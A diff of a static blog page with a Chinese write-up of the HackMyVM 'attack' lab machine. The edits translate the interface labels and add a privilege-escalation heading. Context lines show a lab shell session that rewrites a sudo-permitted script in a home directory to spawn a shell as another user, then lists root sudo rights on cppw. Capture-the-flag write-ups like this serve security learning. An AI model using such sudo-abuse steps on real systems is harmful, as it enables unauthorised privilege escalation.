@@ -20,7 +20,7 @@
 <meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/5.png">
 <meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/6.png">
 <meta property="article:published_time" content="2025-04-23T09:33:05.000Z">
-<meta property="article:modified_time" content="2025-04-23T10:21:32.100Z">
+<meta property="article:modified_time" content="2025-04-23T10:27:33.963Z">
 <meta property="article:author" content="SunRT">
 <meta property="article:tag" content="HACK-MY-VM">
 <meta name="twitter:card" content="summary">
@@ -98,10 +98,10 @@
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
-      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
-      <span id="i-next" class="info" style="display:none;">Post Següent</span>
-      <span id="i-top" class="info" style="display:none;">Adalt</span>
-      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+      <span id="i-prev" class="info" style="display:none;">Vorheriger Beitrag</span>
+      <span id="i-next" class="info" style="display:none;">Nächster Beitrag</span>
+      <span id="i-top" class="info" style="display:none;">Zurück zum Anfang</span>
+      <span id="i-share" class="info" style="display:none;">Beitrag teilen</span>
     </span>
     <br/>
     <div id="share" style="display: none">
@@ -121,7 +121,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"> hack-my-vm-attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">服务渗透</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"> hack-my-vm-attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">服务渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -206,6 +206,8 @@
 <p><strong>可是这个程序又在jackob的家目录下，我们直接删了重写就行[因为在我们的家目录，我们肯定有xw权限]</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">jackob@attack:~$ ls</span><br><span class="line">attack.sh  flag.sh  note.txt  user.txt</span><br><span class="line">jackob@attack:~$ pwd</span><br><span class="line">/home/jackob</span><br><span class="line">jackob@attack:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jackob on attack:</span><br><span class="line">    !env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jackob may run the following commands on attack:</span><br><span class="line">    (kratos) NOPASSWD: /home/jackob/attack.sh</span><br><span class="line">jackob@attack:~$ rm -rf attack.sh </span><br><span class="line">jackob@attack:~$ echo &quot;bash&quot; &gt; attack.sh &amp;&amp; chmod +x attack.sh </span><br><span class="line">jackob@attack:~$ sudo -u kratos /home/jackob/attack.sh</span><br><span class="line">kratos@attack:~$ id</span><br><span class="line">uid=1002(kratos) gid=1002(kratos) groups=1002(kratos)</span><br><span class="line">kratos@attack:~$ </span><br></pre></td></tr></table></figure>
 
+<h2>提权</h2>
+
 <p><strong>拿到kratos权限，再看看有啥东西</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kratos@attack:~$ sudo -l</span><br><span class="line">Matching Defaults entries for kratos on attack:</span><br><span class="line">    !env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User kratos may run the following commands on attack:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/cppw</span><br></pre></td></tr></table></figure>
 
@@ -254,7 +256,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"> hack-my-vm-attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">服务渗透</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"> hack-my-vm-attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">服务渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -275,10 +277,10 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menü</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Teilen</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Nach oben</a>
     </div>
 
   </div>
